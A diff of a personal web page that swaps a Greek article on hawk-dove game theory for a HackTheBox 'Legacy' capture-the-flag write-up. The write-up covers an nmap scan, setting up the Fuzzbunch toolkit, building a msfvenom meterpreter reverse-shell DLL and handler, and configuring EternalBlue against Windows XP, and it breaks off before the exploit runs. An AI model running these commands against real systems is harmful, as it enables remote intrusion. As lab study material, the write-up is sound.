@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Evolutionarily Stable Strategies (available in greek only) - The Portal of Knowledge</title>
-  <meta property='og:title' content="Evolutionarily Stable Strategies (available in greek only) - The Portal of Knowledge">
+  <title>Legacy write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Legacy write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="This article is available only in greek. Εξελικτικά Σταθερή Στρατηγική είναι μια στρατηγική η οποία, αν υιοθετηθεί από έναν πληθυσμό, δεν μπορεί να υποστεί εισβολή από μια διαφορετική (μεταλλαγμένη) στρατηγική διότι σταθεροποιείται μέσω των διεργασίων της φυσικής επιλογής.">
-  <meta property="og:description" content="This article is available only in greek. Εξελικτικά Σταθερή Στρατηγική είναι μια στρατηγική η οποία, αν υιοθετηθεί από έναν πληθυσμό, δεν μπορεί να υποστεί εισβολή από μια διαφορετική (μεταλλαγμένη) στρατηγική διότι σταθεροποιείται μέσω των διεργασίων της φυσικής επιλογής.">
-  <meta property="og:image" content="https://alamot.github.io/images/hawkdove.png">
+  <meta name="description" content="Write-up for the Legacy machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Legacy του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Legacy machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Legacy του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/legacy.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/ess/">
+<meta property="og:url" content="https://alamot.github.io/legacy_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Evolutionarily Stable Strategies (available in greek only) |  ",
+    "headline": "Legacy write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2012-11-01T00:00:00JST",
-    "dateModified": "2012-11-01T00:00:00JST",
+    "datePublished": "2017-10-19T00:00:00JST",
+    "dateModified": "2017-10-19T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -198,13 +198,20 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
         
         
          
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#το-παιχνίδι-περιστέρι-γεράκι">Το παιχνίδι «Περιστέρι-Γεράκι»</a>
+<li><a href="#enumeration">Enumeration</a>
 <ul>
-<li><a href="#συμμετρικοί-αγώνες">Συμμετρικοί αγώνες</a></li>
-<li><a href="#μη-συμμετρικοί-αγώνες">Μη συμμετρικοί αγώνες</a></li>
+<li><a href="#port-scanning">Port scanning</a></li>
 </ul></li>
-<li><a href="#βιβλιογραφία">Βιβλιογραφία</a></li>
+<li><a href="#exploitation">Exploitation</a>
+<ul>
+<li><a href="#installing-fuzzbunch-on-linux">Installing Fuzzbunch on Linux</a></li>
+<li><a href="#setting-up-the-listener">Setting up the listener</a></li>
+<li><a href="#running-fuzzbunch">Running fuzzbunch</a>
+<ul>
+<li><a href="#executing-eternalblue">Executing EternalBlue</a></li>
+<li><a href="#executing-doublepulsar">Executing DoublePulsar</a></li>
+</ul></li>
+</ul></li>
  
       
         <li><a href="#posts-section"><span lang="en">See also</span><span lang="el">Δείτε επίσης</span></a></li>
@@ -246,30 +253,30 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/hawkdove.png);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Evolutionarily Stable Strategies (available in greek only)</h1></header>
-            <header lang="el"><h1 class="title">Εξελικτικά Σταθερές Στρατηγικές</h1></header>
+            <header lang="en"><h1 id="title" class="title">Legacy write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Legacy</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">01 Nov 2012</time>
-            <time lang="el" class="topmargin7">01 Νοε 2012</time>
+            <time lang="en" class="topmargin7">19 Oct 2017</time>
+            <time lang="el" class="topmargin7">19 Οκτ 2017</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/biology'>
-                <span lang="en">Biology</span>
-                <span lang="el">Βιολογία</span>
+              <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
+                <span lang="en">Cybersecurity</span>
+                <span lang="el">Κυβερνοασφάλεια</span>
               </a>
             
             &middot; <i class="fa fa-tags topmargin7" aria-hidden="true"></i>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/evolution'>
-                <span lang="en">evolution</span>
-                <span lang="el">εξέλιξη</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/hackthebox'>
+                <span lang="en">hackthebox</span>
+                <span lang="el">hackthebox</span>
                 </a>
             
-              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/game-theory'>
-                <span lang="en">game theory</span>
-                <span lang="el">θεωρία παιγνίων</span>
+              <a class="label label-primary topmargin7" href='https://alamot.github.io/tags/windows'>
+                <span lang="en">windows</span>
+                <span lang="el">windows</span>
                 </a>
             
          
@@ -279,13 +286,20 @@ if (language) {
             <header lang="el"><h2>Περιεχόμενα</h2></header>
             <div><nav id="TableOfContents">
 <ul>
-<li><a href="#εισαγωγή">Εισαγωγή</a></li>
-<li><a href="#το-παιχνίδι-περιστέρι-γεράκι">Το παιχνίδι «Περιστέρι-Γεράκι»</a>
+<li><a href="#enumeration">Enumeration</a>
 <ul>
-<li><a href="#συμμετρικοί-αγώνες">Συμμετρικοί αγώνες</a></li>
-<li><a href="#μη-συμμετρικοί-αγώνες">Μη συμμετρικοί αγώνες</a></li>
+<li><a href="#port-scanning">Port scanning</a></li>
 </ul></li>
-<li><a href="#βιβλιογραφία">Βιβλιογραφία</a></li>
+<li><a href="#exploitation">Exploitation</a>
+<ul>
+<li><a href="#installing-fuzzbunch-on-linux">Installing Fuzzbunch on Linux</a></li>
+<li><a href="#setting-up-the-listener">Setting up the listener</a></li>
+<li><a href="#running-fuzzbunch">Running fuzzbunch</a>
+<ul>
+<li><a href="#executing-eternalblue">Executing EternalBlue</a></li>
+<li><a href="#executing-doublepulsar">Executing DoublePulsar</a></li>
+</ul></li>
+</ul></li>
 </ul>
 </nav></div>
           </section>
@@ -293,149 +307,401 @@ if (language) {
         
         
 
-<h1 id="εισαγωγή">Εισαγωγή</h1>
+<h1 id="enumeration">Enumeration</h1>
 
-<p><em>Εξελικτικά Σταθερή Στρατηγική</em> (ΕΣΣ) είναι μια στρατηγική η οποία, αν υιοθετηθεί από έναν πληθυσμό, δεν μπορεί να υποστεί εισβολή από μια διαφορετική (μεταλλαγμένη) στρατηγική διότι σταθεροποιείται μέσω των διεργασίων της φυσικής επιλογής. Μπορούμε  να  εκφράσουμε  διαφορετικά  αυτή  την ιδέα  αν  πούμε  ότι  η  καλύτερη  στρατηγική  για  ένα  μεμονωμένο  άτομο  εξαρτάται  από  αυτό  που κάνουν  τα  περισσότερα  άτομα  του  πληθυσμού.  Επειδή  το  υπόλοιπο  του  πληθυσμού  αποτελείται και αυτό από μεμονωμένα άτομα, και το καθένα προσπαθεί να μεγιστοποιήσει τα δικά του κέρδη, η  μόνη  στρατηγική  που  σταθεροποιείται  είναι  αυτή  η  οποία,  μόλις  εμφανιστεί  διαμέσου  της εξέλιξης,  δεν  μπορεί  να  βελτιωθεί  περισσότερο  από  κάποιο  άτομο  που  αποκλίνει  από  τη συγκεκριμένη στρατηγική. Ύστερα από μια περιβαλλοντική αλλαγή μπορεί να υπάρξει μια  σύντομη  περίοδος  αστάθειας  στην  εξέλιξη  ή  ακόμη  και  διακύμανση  στον  πληθυσμό.  Μόλις όμως  επιτευχθεί  κάποια  εξελικτικά  σταθερή  στρατηγική,  αυτή σταθεροποιείται.  Η φυσική επιλογή θα «τιμωρήσει» κάθε εκτροπή. Όταν, όμως, διαδραματίζονται σημαντικής κλίμακας μεταβολές στο εξωτερικό περιβάλλον, τότε τροποποιούνται οι ίδιες οι εξελεκτικές πιέσεις, δηλαδή οι δυνάμεις της φυσικής επιλογής, οπότε σε αυτήν την περίπτωση η θεωρία των ΕΣΣ δεν ισχύει.</p>
+<h2 id="port-scanning">Port scanning</h2>
 
-<h1 id="το-παιχνίδι-περιστέρι-γεράκι">Το παιχνίδι «Περιστέρι-Γεράκι»</h1>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A 10.10.10.4
 
-<p>Η πρώτη παρουσίαση μιας εκδοχής του παιχνιδιού «Περιστέρι-Γεράκι», στο πεδίο της βιολογίας, έγινε το 1973 από τους John Maynard Smith και George Price σε ένα άρθρο τους στο περιοδικό Nature με τίτλο «The logic of animal conflict». Ο παραδοσιακός πίνακας πληρωμής για το παιχνίδι είναι ο εξής:</p>
+Nmap scan report for 10.10.10.4
+PORT     STATE  SERVICE       VERSION
+139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server
+Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
+OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
 
-<div class="overflowx">
-<table class="centered bordered padded centered">
-<tr>
-<th class="hidden"></th>
-<th>Περιστέρι</th>
-<th>Γεράκι</th>
-<tr>
-<th>Περιστέρι</th>
-<td>V/2, V/2</td>
-<td>0, V</td>
-</tr><tr>
-<th>Γεράκι</th>
-<td>V, 0</td>
-<td>(V-C)/2, (V-C)/2</td>
-</tr>
-</table>
-</div>
+Host script results:
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)</code></pre></div></div>
 
-<p>όπου V είναι η αξία του πόρου για τον οποίο γίνεται η διαμάχη και C το κόστος της διαμάχης για την απόκτηση του πόρου. Θεωρούμε ότι η αξία του πόρου είναι πάντα μικρότερη από το κόστος της μάχης (δηλαδή C &gt; V &gt; 0). Στην περίπτωση που C ≤ V, το παιχνίδι που προκύπτει έχει εντελώς διαφορετική εξέλιξη. Η ακριβής τιμή του αποτελέσματος της συνάντησης περιστέρι με περιστέρι ποικίλει ανάμεσα στα διάφορα μοντέλα. Κάποιες φορές η αξία του πόρου μοιράζεται ακριβώς στη μέση (V/2), ενώ άλλες φορές και τα δύο άτομα παίρνουν 0, αφού θεωρούμε ότι επιδίδονται σε ένα πόλεμο επίδειξης από το οποίο τελικά δεν ωφελείται κανένα.</p>
+<h1 id="exploitation">Exploitation</h1>
 
-<p>Στο βιβλίο του «Το εγωιστικό γονίδιο», ο Richard Dawkins αναφέρει σχετικά με το παιχνίδι «Περιστέρι-Γεράκι»:</p>
+<h2 id="installing-fuzzbunch-on-linux">Installing Fuzzbunch on Linux</h2>
 
-<blockquote>
-«Ας εξετάσουμε  ένα  από τα  απλούστερα  υποθετικά  παραδείγματα  του Maynard Smith.  Ας  υποθέσουμε  ότι  σε  κάποιο πληθυσμό ενός συγκεκριμένου είδους υπάρχουν μόνο δύο τύποι στρατηγικής μάχης: του γερακιού και  του  περιστεριού. (Τα  ονόματα  έχουν  συμβατικό  χαρακτήρα  και  δεν  σχετίζονται  με  τις συνήθειες  των  εν  λόγω  πουλιών.  Στην  πραγματικότητα,  τα  περιστέρια  είναι  μάλλον επιθετικά πουλιά).  Κάθε  άτομο  του  υποθετικού  πληθυσμού  μας  ταξινομείται  ως  γεράκι  ή  περιστέρι.  Τα γεράκια  μάχονται  πάντα  ασυγκράτητα  και  όσο  σκληρότερα  μπορούν.  Υποχωρούν  μόνο  όταν πληγωθούν σοβαρά. Τα περιστέρια απλώς απειλούν με αξιοπρεπή συμβατικό τρόπο, χωρίς ποτέ να πληγώνουν κανένα. Αν ένα γεράκι επιτεθεί σ’ ένα περιστέρι, το τελευταίο απομακρύνεται αμέσως και  συνεπώς  δεν  πληγώνεται.  Αν  ένα  γεράκι  επιτεθεί  σε  άλλο  γεράκι,  η  μάχη  που  θα επακολουθήσει  θα  συνεχιστεί  ωσότου  ένα  από  τα  δύο  πληγωθεί  σοβαρά  ή  θανάσιμα.  Αν  ένα περιστέρι  συναντήσει  κάποιο  άλλο  περιστέρι  κανένα  τους  δεν  πληγώνεται.  Το  καθένα  κάνει διάφορα  καμώματα  απέναντι  στο  άλλο  για  αρκετή  ώρα,  ώσπου  κάποιο  να  βαρεθεί  ή  να αποφασίσει να μην ασχοληθεί άλλο, οπότε υποχωρεί. Προς το παρόν υποθέτουμε ότι κάθε άτομο δεν μπορεί να ξέρει από πριν αν ένας συγκεκριμένος αντίπαλος είναι γεράκι ή περιστέρι. Αυτό το ανακαλύπτει  μόνο  την  ώρα  της  μάχης  και  δεν  θυμάται  τίποτε  από  προηγούμενες   συμπλοκές  με συγκεκριμένους αντιπάλους ώστε να βγάλει κάποιο συμπέρασμα».
-</blockquote>
+<p>Install wine and winetricks using the package manager of your linux distro.
+We initiate a wine32 environment (you may need to install 32-bit packages)
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ WINEPREFIX=&#34;$HOME/.wine-fuzzbunch&#34; WINEARCH=win32 wine wineboot</code></pre></div></div></p>
 
-<h2 id="συμμετρικοί-αγώνες">Συμμετρικοί αγώνες</h2>
+<p>Install python26 via winetricks
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ WINEPREFIX=&#34;$HOME/.wine-fuzzbunch&#34; winetricks python26</code></pre></div></div></p>
 
-<p>Με  κάποια  εντελώς  αυθαίρετα  κριτήρια ας βαθμολογήσουμε τους  αντιπάλους σύμφωνα με τον παρακάτω πίνακα:</p>
+<p>Get files from git
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cd $HOME/.wine-fuzzbunch/drive_c &amp;&amp; git clone https://github.com/mdiazcl/fuzzbunch-debian</code></pre></div></div></p>
 
-<div class="overflowx">
-<table class="centered bordered padded centered">
-<tr>
-<th class="hidden"></th>
-<th>Περιστέρι</th>
-<th>Γεράκι</th>
-<tr>
-<th>Περιστέρι</th>
-<td>0, 0</td>
-<td>-1 στο περιστέρι, +1 στο γεράκι</td>
-</tr><tr>
-<th>Γεράκι</th>
-<td>+1 στο γεράκι, -1 στο περιστέρι</td>
-<td>-10, -10</td>
-</tr>
-</table>
-</div>
+<p>I have written a little script to run fuzzbunch:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nano /usr/local/bin/fuzzbunch 
+    export WINEPREFIX=$HOME/.wine-fuzzbunch
+    cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows
+    wine ../../Python26/python.exe fb.py
 
-<p>Αυτό που έχει σημασία είναι ότι δεν μας ενδιαφέρει αν τα γεράκια νικούν όταν οι αντίπαλοί τους είναι περιστέρια. Αυτό το ξέρουμε. Σε αυτήν την περίπτωση νικούν πάντα τα γεράκια. Αυτό που θέλουμε να μάθουμε είναι ποια από τις δύο στρατηγικές είναι εξελικτικά σταθερή: του γερακιού ή του περιστεριού; Αν από αυτές τις δύο στρατηγικές μόνο η μία είναι ΕΣΣ, τότε πρέπει να περιμένουμε ότι αυτή θα εξελιχθεί σε  ΕΣΣ.  Θεωρητικά,  είναι  δυνατό  να  υπάρχουν  δύο  εξελικτικά  σταθερές  στρατηγικές.  Αυτό  θα συνέβαινε αν η καλύτερη στρατηγική για κάθε συγκεκριμένο άτομο ήταν να κάνει ό,τι κάνουν τα περισσότερα άτομα του πληθυσμού, ανεξάρτητα από το αν η στρατηγική τους είναι του γερακιού ή  του  περιστεριού.  Σ’  αυτήν  την  περίπτωση  ο  πληθυσμός  θα  έτεινε  να  καθηλωθεί  στη  σταθερή κατάσταση που θα παρουσιαζόταν πρώτη.</p>
+$ sudo chmod +x /usr/local/bin/fuzzbunch</code></pre></div></div></p>
 
-<figure>
-<img class="bordered" src="/images/ess_table1.png" alt="Πίνακας 1" title="Πίνακας 1">
-<figcaption>Παρατηρούμε ότι τα περιστέρια τα έχουν πάει σαφώς καλύτερα από τα γεράκια», τόσο σε ατομικό όσο και σε ομαδικό επίπεδο. Τα γεράκια μπορεί να πλεονεκτούν όταν έρχονται αντιμέτωπα με περιστέρια, αλλά έχουν μεγάλες απώλειες όταν συναντιόνται μεταξύ τους.
-</figcaption>
-</figure>
+<p>Making the shellcode payload
+We need a DLL shellcode payload. You can use msfvenom to make it or anything else you like:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cd $HOME/.wine-fuzzbunch/drive_c/
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[INSERT_YOUR_IP_HERE] LPORT=60000 -f dll -o shell.dll
 
-<p>Αν δούμε αυτό το παιχνίδι υπό το πρίσμα του ανταγωνισμού για περιορισμένους πόρους και της φυσικής επιλογής, καταλαβαίνουμε ότι δεν ευνοούνται στρατηγικές έντονου ανταγωνισμού για ένα πόρο, γιατί τα μέλη των ειδών που υιοθετούν τέτοιες στρατηγικές θα έχουν σοβαρές επιπτώσεις όταν έρθουν αντιμέτωπα μεταξύ τους. Αντίθετα, στρατηγικές υποχώρησης είναι πιο συμφέρουσες γιατί οδηγούν σε αμοιβαία εκμετάλλευση των πόρων με μικρότερο κόστος, αφού  όταν το περιστέρι συναντήσει αντίπαλό αποφεύγει να έρθει σε σύγκρουση.</p>
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+Final size of dll file: 5120 bytes
+Saved as: shell.dll</code></pre></div></div></p>
 
-<p>Όμως, καμιά από αυτές τις δύο  στρατηγικές,  του  γερακιού  ή  του  περιστεριού,  δεν  φαίνεται να είναι  από  μόνη  της  εξελικτικά  σταθερή. Σε ένα πληθυσμό που αποτελείται μόνο από περιστέρια μόλις εισαχθεί ένα γεράκι θα έχει απίστευτο πλεονέκτημα αφού θα νικάει πάντα. Θα αρχίσουν, λοιπόν, να επικρατούν τα γονίδια του και ο αριθμός των γερακιών θα αυξηθεί στον γενικό πληθυσμό. Τότε, όμως, θα υπάρχει έντονος ανταγωνισμός μεταξύ των γερακιών οπότε τα περιστέρια θα βρίσκονται σε πλεονεκτική θέση. Έτσι, θα υπάρξει κάποια    περιοδική  μεταβολή  του πληθυσμού.</p>
+<h2 id="setting-up-the-listener">Setting up the listener</h2>
 
-<p>Εντούτοις,  αυτή  η  ταλάντωση  δεν  είναι  υποχρεωτικό να είναι συνεχής.  Υπάρχει  μια  κατάσταση  όπου  ο  λόγος του αριθμού  των  γερακιών  προς  τον  αριθμό  των  περιστεριών  παραμένει σταθερός και η τιμή αυτού του λόγου μπορεί να υπολογιστεί με βάση τις τιμές του πίνακα βαθμολογίας. Έτσι, η ΕΣΣ για το παιχνίδι Περιστέρι-Γεράκι αποτελεί στην ουσία μια μεικτή στρατηγική. Μάλιστα, πρέπει να τονίσουμε ότι, σε θεωρητικό επίπεδο, δεν υπάρχει διαφορά εάν αυτή η μεικτή στρατηγική προκύπτει από ένα πληθυσμό από διαφορετικά άτομα που έχουν διακριτούς ρόλους (περιστέρι ή γεράκι) ή από ένα πληθυσμό με άτομα που εναλλάσσουν τις δύο στρατηγικές με βάση ορισμένη αναλογία. Σε βιολογικό επίπεδο, βέβαια, οι δύο ιδέες είναι εντελώς διαφορετικές.</p>
+<p>Again, you can use whatever listener you like. Here, I use the handler from metasploit:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
+msf &gt; use exploit/multi/handler 
+msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(handler) &gt; set LHOST=INSERT_YOUR_IP_HERE
+msf exploit(handler) &gt; set LPORT 60000
+msf exploit(handler) &gt; exploit
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on YOUR_IP_HERE:60000</code></pre></div></div></p>
 
-<h2 id="μη-συμμετρικοί-αγώνες">Μη συμμετρικοί αγώνες</h2>
+<h2 id="running-fuzzbunch">Running fuzzbunch</h2>
 
-<p>Ως τώρα εξετάσαμε μόνο τους αγώνες που ο Maynard Smith τους ονομάζει «συμμετρικούς». Αυτό σημαίνει  πως  δεχτήκαμε  ότι  οι  αντίπαλοι  είναι  σε  όλα  όμοιοι,  εκτός  από  την  αγωνιστική στρατηγική  τους.  Υποθέσαμε  ότι  τα  γεράκια  και  τα  περιστέρια  είναι  εξίσου  δυνατά,  ότι  είναι προικισμένα  με  τα  ίδια  όπλα  και  τις  ίδιες  αρματωσιές  και  ότι  η  νίκη  θα  τους  αποφέρει  το  ίδιο κέρδος. Όλα αυτά είναι βολικές υποθέσεις για να φτιάξουμε ένα μοντέλο, που όμως δεν είναι πολύ ρεαλιστικό.  Οι Parker  και  Smith  μελέτησαν και «μη συμμετρικούς» αγώνες. Ίσως  το  σημαντικότερο  είδος  μη  αυθαίρετης  ασυμμετρίας  είναι  το  μέγεθος  και  η  γενική αγωνιστική  ικανότητα.  Το  μεγάλο  μέγεθος  δεν  είναι  υποχρεωτικά  η  σημαντικότερη  ιδιότητα  για να  νικά  κανείς  πάντα  στους  αγώνες,  ίσως  όμως  είναι  μία  από  αυτές.</p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ fuzzbunch 
 
-<p>Για παράδειγμα, αν τα άτομα  διαφέρουν  σε  μέγεθος  και  αγωνιστική  ικανότητα,  και  κάθε  άτομο  είναι  σε  θέση  να συγκρίνει  το  μέγεθος  του  αντιπάλου  με  το  δικό  του,  αυτό  επηρεάζει  την  εμφανιζόμενη  ΕΣΣ;
-Σε ένα άλλο παιχνίδι, λοιπόν, θεωρούμε ότι τα άτομα έχουν διαφορετικά μεγέθη. Έτσι ένα μεγάλο γεράκι θα υπερισχύσει ενός μικρού, ένα μεγάλο περιστέρι θα υπερισχύσει ενός μικρού και ένα μεγάλο περιστέρι θα υπερισχύσει ενός μικρού γερακιού. Οι βαθμολογίες προσαρμόζονται ανάλογα, όπως φαίνεται στον παρακάτω πίνακα.</p>
+[*] Loading Plugins
+[*] Initializing Fuzzbunch v3.5.1
+[*] Adding Global Variables
+[+] Set ResourcesDir =&gt; C:\fuzzbunch-debian\windows\Resources
+[+] Set Color =&gt; True
+[+] Set ShowHiddenParameters =&gt; False
+[+] Set NetworkTimeout =&gt; 60
+[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs
+[*] Autorun ON
 
-<div class="overflowx">
-<table class="centered bordered padded centered">
-<tr>
-<th class="hidden"></th>
-<th>Περιστέρι μεγάλο</th>
-<th>Περιστέρι μικρό</th>
-<th>Γεράκι μεγάλο</th>
-<th>Γεράκι μικρό</th>
-<tr>
-<th>Περιστέρι μεγάλο</th>
-<td>0, 0</td>
-<td>+1 στο μεγάλο περιστέρι<br>0 στο μικρό περιστέρι</td>
-<td>+0,5 στο γεράκι<br>+0,5 στο περιστέρι</td>
-<td>+1 στο περιστέρι<br>0 στο γεράκι</td>
-</tr><tr>
-<th>Περιστέρι μικρο</th>
-<td>+1 στο μεγάλο περιστέρι<br> 0 στο μικρό περιστέρι</td>
-<td>0, 0</td>
-<td>+1 στο γεράκι<br>-1 στο περιστέρι</td>
-<td>+0,5 στο γεράκι<br>+0,5 στο περιστέρι</td>
-</tr><tr>
-<th>Γεράκι μεγάλο</th>
-<td>+0,5 στο γεράκι<br>+0,5 στο περιστέρι</td>
-<td>+1 στο γεράκι<br>-1 στο περιστέρι</td>
-<td>-10, -10</td>
-<td>+1 στο μεγάλο γεράκι<br>0 στο μικρό γεράκι</td>
-</tr><tr>
-<th>Γεράκι μικρό</th>
-<td>+1 στο περιστέρι<br>0 στο γεράκι</td>
-<td>+0,5 στο γεράκι<br>+0,5 στο περιστέρι</td>
-<td>+1 στο μεγάλο γεράκι<br>0 στο μικρό γεράκι</td>
-<td>-10, -10</td>
-</tr>
-</table>
-</div>
+[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage
 
-<figure>
-<img class="bordered" src="/images/ess_table2.png" alt="Πίνακας 2" title="Πίνακας 2">
-<figcaption></figcaption>
-</figure>
+[*] Retargetting Session
 
-<p>Σε αυτή την εκδοχή καλύτερα από όλους έχουν πάει τα μεγάλα περιστέρια. Ακόμη και τα μικρά περιστέρια τα πάνε καλύτερα σε σύγκριση με τα γεράκια, για τους ίδιους ακριβώς λόγους που έχουμε ήδη αναφέρει. Αλλά, είναι επίσης ενδιαφέρον το γεγονός ότι τα γεράκια έχουν περιορίσει θεαματικά τις απώλειες τους. Για την ακρίβεια, όλα τα άτομα και οι ομάδες, είτε πρόκειται για περιστέρια είτε για γεράκια, μικρά και μεγάλα, τα πάνε πολύ καλύτερα σε σχέση με τον πρώτο γύρο όπου δεν είχαμε διαφοροποιήσεις στο μέγεθος. Αυτό είναι ενδεικτικό ότι η μεγαλύτερη ποικιλομορφία σε ένα πληθυσμό, συμβάλλει στη δημιουργία πιο σύνθετων και -σε μερικές περιπτώσεις- πιο σταθερών εξελικτικών ισορροπιών.</p>
+[?] Default Target IP Address [] : 10.10.10.4
+[?] Default Callback IP Address [] : [INSERT_YOUR_IP_HERE]     
+[?] Use Redirection [yes] : no
 
-<p lang="en" class="author">Antonios Tsolis</p>
-<p lang="el" class="author">Αντώνιος Τσώλης</p>
+[?] Base Log directory [C:\fuzzbunch-debian\logs] : 
+[*] Checking C:\fuzzbunch-debian\logs for projects
+Index     Project                 
+-----     -------                 
+0         Create a New Project    
 
-<h1 id="βιβλιογραφία">Βιβλιογραφία</h1>
+[?] Project [0] : 0
+[?] New Project Name : LEGACY
+[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\legacy\z10.10.10.4&#39;? [Yes] : 
 
-<ul>
-<li>J. Maynard Smith &amp; G. R. Price, « The Logic of Animal Conflict», Nature 246, 15 - 18 (02 November 1973)</li>
-<li>Richard Dawkins, «Το εγωιστικό γονίδιο», 2η έκδοση, Εκδόσεις ΣΥΝΑΛΜΑ, 1998.</li>
-<li><a href="http://en.wikipedia.org/wiki/Evolutionarily_stable_strategy" target="_blank">http://en.wikipedia.org/wiki/Evolutionarily_stable_strategy</a></li>
-<li><a href="http://en.wikipedia.org/wiki/Chicken_(game)" target="_blank">http://en.wikipedia.org/wiki/Chicken_(game)</a></li>
-<li><a href="http://en.wikipedia.org/wiki/Prisoner%27s_dilemma" target="_blank">http://en.wikipedia.org/wiki/Prisoner%27s_dilemma</a></li>
-</ul>
+[*] Initializing Global State
+[+] Set TargetIp =&gt; 10.10.10.4
+[+] Set CallbackIp =&gt; [INSERT_YOUR_IP_HERE]
+
+[!] Redirection OFF
+[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\legacy\z10.10.10.4
+[+] Set Project =&gt; legacy</code></pre></div></div>
+
+<h3 id="executing-eternalblue">Executing EternalBlue</h3>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">fb &gt; use EternalBlue
+
+[!] Entering Plugin Context :: Eternalblue
+[*] Applying Global Variables
+[+] Set NetworkTimeout =&gt; 60
+[+] Set TargetIp =&gt; 10.10.10.4
+
+[*] Applying Session Parameters
+[*] Running Exploit Touches
+
+[!] Enter Prompt Mode :: Eternalblue
+
+Module: Eternalblue
+===================
+
+[?] Prompt For Variable Settings? [Yes] : y
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
+[?] NetworkTimeout [60] : 
+[*]  TargetIp :: Target IP Address
+[?] TargetIp [10.10.10.4] : 
+[*]  TargetPort :: Port used by the SMB service for exploit connection
+[?] TargetPort [445] : 
+[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
+[?] VerifyTarget [True] : 
+[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
+[?] VerifyBackdoor [True] : 
+[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
+[?] MaxExploitAttempts [3] : 
+[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
+[?] GroomAllocations [12] : 
+[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+
+*-&gt; 0) XP            Windows XP 32-Bit All Service Packs
+    1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+
+[?] Target [1] : 0
+[+] Set Target =&gt; XP
+
+[!] Preparing to Execute Eternalblue
+
